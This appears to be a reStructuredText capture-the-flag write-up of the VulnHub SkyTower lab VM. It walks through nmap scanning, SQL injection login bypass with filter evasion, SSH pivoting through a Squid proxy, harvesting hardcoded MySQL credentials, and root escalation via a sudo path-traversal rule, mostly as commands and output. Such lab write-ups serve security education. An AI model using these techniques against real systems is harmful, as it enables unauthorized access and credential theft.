@@ -1,0 +1,297 @@
+.. include:: /pentest_links.txt
+
+.. _SkyTower1:
+
+**********
+SkyTower1
+**********
+
+This is to document the meetup’s efforts responding to the challenge `SkyTower <http://vulnhub.com/entry/skytower-1,96/>`_.
+
+We skip the setup of the provided `VirtualBox` VDI, assuming that it is running on the local network.
+
+
+network reconnaisance
+=====================
+
+Since skytower is on our local network we'll use `nmap` to fingerprint all hosts to figure out which one is skytower:
+
+.. code-block:: console
+
+  hacker@kali:~$ sudo nmap -n -F -O 192.168.1.0/24
+  ###################### SNIP ######################
+  Nmap scan report for 192.168.1.105
+  Host is up (0.0039s latency).
+  Not shown: 97 closed ports
+  PORT     STATE    SERVICE
+  22/tcp   filtered ssh
+  80/tcp   open     http
+  3128/tcp open     squid-http
+  MAC Address: 08:00:27:54:4A:37 (Cadmus Computer Systems)
+  Device type: general purpose
+  Running: Linux 3.X
+  OS CPE: cpe:/o:linux:linux_kernel:3
+  OS details: Linux 3.2 - 3.10
+  Network Distance: 1 hop
+  ###################### SNIP ######################
+  OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+  Nmap done: 256 IP addresses (7 hosts up) scanned in 17.06 seconds
+
+The most likely IP for skywalker is 192.168.1.105 which is running ssh (filtered), http, and a squid-http proxy. For completeness we'll get the service versions.
+
+.. code-block:: console
+
+  hacker@kali:~$ sudo nmap -n -sV -p T:22,80,3128  192.168.1.105
+
+  Starting Nmap 6.47 ( http://nmap.org ) at 2014-11-05 09:32 PST
+  Nmap scan report for 192.168.1.105
+  Host is up (0.0014s latency).
+  PORT     STATE    SERVICE    VERSION
+  22/tcp   filtered ssh
+  80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
+  3128/tcp open     http-proxy Squid http proxy 3.1.20
+  MAC Address: 08:00:27:54:4A:37 (Cadmus Computer Systems)
+
+  Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds
+
+web server sql injection
+========================
+
+Pointing a web browser at the skytower web server reveals a login form:
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.105
+  hacker@kali:~$ curl $TARGET 2>/dev/null | sed -n '/<form/,/<\/form/p'
+     <form style="margin: 0 auto;width:250px;" action='login.php' method='POST'>
+       <br><strong>Skytech Login:</strong><br><br>
+       <label for="email" style="display: inline-block; width: 90px;" >E-mail:</label>
+       <input name="email" type="text" size=15 ><br><br>
+       <label for="password" style="display: inline-block; width: 90px;">Password:</label>
+       <input name="password" type="password" size=15><br><br>
+       <input type="submit" value="Login">
+     </form>
+
+So the login form has 2 arguments: *email* and *password*. Let's look for SQL injection exploits by trying first *email* as ``test'`` (note the trailing single quote ') and *password* as the empty string.
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.105
+  hacker@kali:~$ curl --silent --form action=login.php --form email="test'" \
+      --form password="" --form submit="Login" \
+      http://$TARGET/login.php
+  There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''test'' and password=''' at line 1]
+  hacker@kali:~$ 
+ 
+This one query is revealing because of the error message: SQL injection is possible, the backend database is MySQL, and the actual query looks something like ``SELECT * FROM table where email = '$email' and password = '$password'`` (where $email and $password are the user input values). That is, stripping off the surrounding single quotes from the error message leaves ``'test'' and password=''``, implying the above query format.
+
+Knowing this allows crafting a simple SQL injection. Since ``OR`` has lower precedence than ``AND``, if we append ``OR NOT ''`` we get a query like ``email = '' and password = '' OR NOT ''`` which is always true. So let's try that first using *email* as the empty string and *password* = ``' OR NOT '``:
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.105
+  hacker@kali:~$ curl --silent --form action=login.php --form email="" \
+      --form password="' OR NOT '" --form submit="Login" \
+      http://$TARGET/login.php
+  <br>Login Failed</br>
+  hacker@kali:~$ 
+
+Wait - it was valid syntax and should have worked but didn't. Let's force a syntax error to see what's going on by removing the leading ``'`` in *password*.
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.105
+  hacker@kali:~$ curl --silent --form action=login.php \
+      --form email="" --form password=" OR NOT '" --form submit="Login" \
+      http://$TARGET/login.php
+  There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''   ''' at line 1]
+  hacker@kali:~$ 
+
+What happened to ``OR NOT``? It was apparently filtered out. Knowing that MySQL could also use ``|| !`` for the same thing we'll try that:
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.105
+  hacker@kali:~$ curl --silent --form action=login.php --form email="" \
+      --form password="' || ! '" --form submit="Login" \
+      http://$TARGET/login.php
+  <HTML>
+  ###################### SNIP ######################
+    <br><strong><font size=4>Welcome john@skytech.com</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: john</strong><br><strong>Password: hereisjohn</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>
+  hacker@kali:~$ 
+
+Intermediate success! We've just been given instructions to SSH using userid/password john/hereisjohn. Before we do that, what if ``|| !`` were also filtered? Then we would have tried ``OORR NNOTOT``, which also works. Filtering input is hard. Note the following also work: both email & password as ``' * '``; or email = ``' *`` and password = ``|| ! '``.
+
+
+web server shell access
+=======================
+
+Of course it can't be as easy as ``TARGET=192.168.1.105   ssh john@$TARGET`` which hangs (remember the ``nmap`` ssh state of "filtered"). However, ``ssh`` works through the proxy server on $TARGET using the option *ProxyCommand* with either ``socat`` or ``proxytunnel``. Since ``socat`` is more likely to be present on a server we prefer that method but illustrate both. Note that the ``ssh`` destination "john@127.0.0.1" is relative to the proxy server, not the local host.
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.105
+  hacker@kali:~$ ssh -o "ProxyCommand proxytunnel -p $TARGET:3128 \
+      -d %h:%p" john@127.0.0.1
+  Via 192.168.1.105:3128 -> 127.0.0.1:22
+  ###################### SNIP ######################
+  john@127.0.0.1's password: 
+  Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
+  ###################### SNIP ######################
+  Last login: Fri Jun 20 07:41:08 2014
+
+  Funds have been withdrawn
+  Connection to 127.0.0.1 closed.
+  hacker@kali:~$ 
+
+  hacker@kali:~$ ssh -o \
+      "ProxyCommand socat STDIO PROXY:$TARGET:%h:%p,proxyport=3128" \
+      john@127.0.0.1
+  john@127.0.0.1's password: 
+  Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
+  ###################### SNIP ######################
+  Last login: Wed Nov  5 14:37:02 2014 from localhost
+
+  Funds have been withdrawn
+  Connection to 127.0.0.1 closed.
+  hacker@kali:~$ 
+
+However, the ``ssh`` immediately logs off. So we tried to instead run the command ``exec /bin/bash`` and that avoided the immediate logoff (adding in the problem of an environment without .profile nor .bashrc being run). But that gave us the hint why we were immediately logged off: either .profile or .bashrc caused the exit, so we fix that:
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.105
+  hacker@kali:~$ ssh -o \
+      "ProxyCommand socat STDIO PROXY:$TARGET:%h:%p,proxyport=3128" \
+      john@127.0.0.1 exec /bin/bash
+  john@127.0.0.1's password: 
+  ls -a
+  .  ..  .bash_history  .bash_logout  .bashrc  .profile
+  cat .profile
+  ###################### SNIP ######################
+  cat .bashrc
+  ###################### SNIP ######################
+  exit
+  # get rid of the ending exit command
+  mv .bashrc bashrc
+  grep -v exit bashrc > .bashrc
+
+Now we can login and not get logged off. But our user can't do much of anything as they have few privileges.
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.105
+  hacker@kali:~$ ssh -o \
+      "ProxyCommand socat STDIO PROXY:$TARGET:%h:%p,proxyport=3128" \
+      john@127.0.0.1
+  john@127.0.0.1's password: 
+  ###################### SNIP ######################
+  john@SkyTower:~$ id
+  uid=1000(john) gid=1000(john) groups=1000(john)
+  john@SkyTower:~$ sudo -l
+  [sudo] password for john: 
+  Sorry, user john may not run sudo on SkyTower.
+
+So we'll search for another user that might have more privileges by looking at the MySQL database.
+
+dump the MySQL user database
+============================
+
+Now we're on skywalker as non-root user john. There are many options for capturing the flag: Apache web server, squid proxy, OS misconfiguration, and a MySQL database having user account information (being perhaps the most likely candidate). Below we dump the user account information by getting the MySQL root access from the *login.php* script.
+
+.. code-block:: console
+
+  john@SkyTower:~$ grep DocumentRoot /etc/apache2/sites-available/default
+    DocumentRoot /var/www
+  john@SkyTower:~$ more /var/www/login.php 
+  ###################### SNIP ######################
+  $db = new mysqli('localhost', 'root', 'root', 'SkyTech');
+  ###################### SNIP ######################
+  john@SkyTower:/var/www$ mysql -u root -proot
+  Welcome to the MySQL monitor.  Commands end with ; or \g.
+  ###################### SNIP ######################
+  mysql> show databases
+      -> ;
+  +--------------------+
+  | Database           |
+  +--------------------+
+  | information_schema |
+  | SkyTech            |
+  | mysql              |
+  | performance_schema |
+  +--------------------+
+  4 rows in set (0.00 sec)
+
+  mysql> use SkyTech
+  Reading table information for completion of table and column names
+  You can turn off this feature to get a quicker startup with -A
+
+  Database changed
+  mysql> show tables
+      -> ;
+  +-------------------+
+  | Tables_in_SkyTech |
+  +-------------------+
+  | login             |
+  +-------------------+
+  1 row in set (0.00 sec)
+
+  mysql> select * from login;
+  +----+---------------------+--------------+
+  | id | email               | password     |
+  +----+---------------------+--------------+
+  |  1 | john@skytech.com    | hereisjohn   |
+  |  2 | sara@skytech.com    | ihatethisjob |
+  |  3 | william@skytech.com | senseable    |
+  +----+---------------------+--------------+
+  3 rows in set (0.00 sec)
+
+  mysql> quit
+  Bye
+
+One minor correction: william's password is actually "sensable", not "senseable" as found in the login table.
+
+
+capture the flag
+================
+
+User william/sensable was a dead end but sara/ihatethisjob captured the flag. 
+
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.105
+  hacker@kali:~$ ssh -o \
+      "ProxyCommand socat STDIO PROXY:$TARGET:%h:%p,proxyport=3128" \
+      william@127.0.0.1 exec /bin/bash
+  william@127.0.0.1's password: 
+  id
+  uid=1002(william) gid=1002(william) groups=1002(william)
+  sudo -l
+  sudo: no tty present and no askpass program specified
+  exit
+  hacker@kali:~$ ssh -o \
+      "ProxyCommand socat STDIO PROXY:$TARGET:%h:%p,proxyport=3128" \
+      sara@127.0.0.1 exec /bin/bash
+  sara@127.0.0.1's password: 
+  id
+  uid=1001(sara) gid=1001(sara) groups=1001(sara)
+  sudo -l
+  Matching Defaults entries for sara on this host:
+      env_reset, mail_badpass,
+      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+  User sara may run the following commands on this host:
+      (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
+  sudo ls /accounts/../root/
+  flag.txt
+  sudo cat /accounts/../root/flag.txt
+  Congratz, have a cold one to celebrate!
+  root password is theskytower
+  exit
+  hacker@kali:~$ ssh -o "ProxyCommand socat STDIO PROXY:$TARGET:%h:%p,proxyport=3128" root@127.0.0.1
+  root@127.0.0.1's password: 
+  ###################### SNIP ######################
+  root@SkyTower:~# id
+  uid=0(root) gid=0(root) groups=0(root)
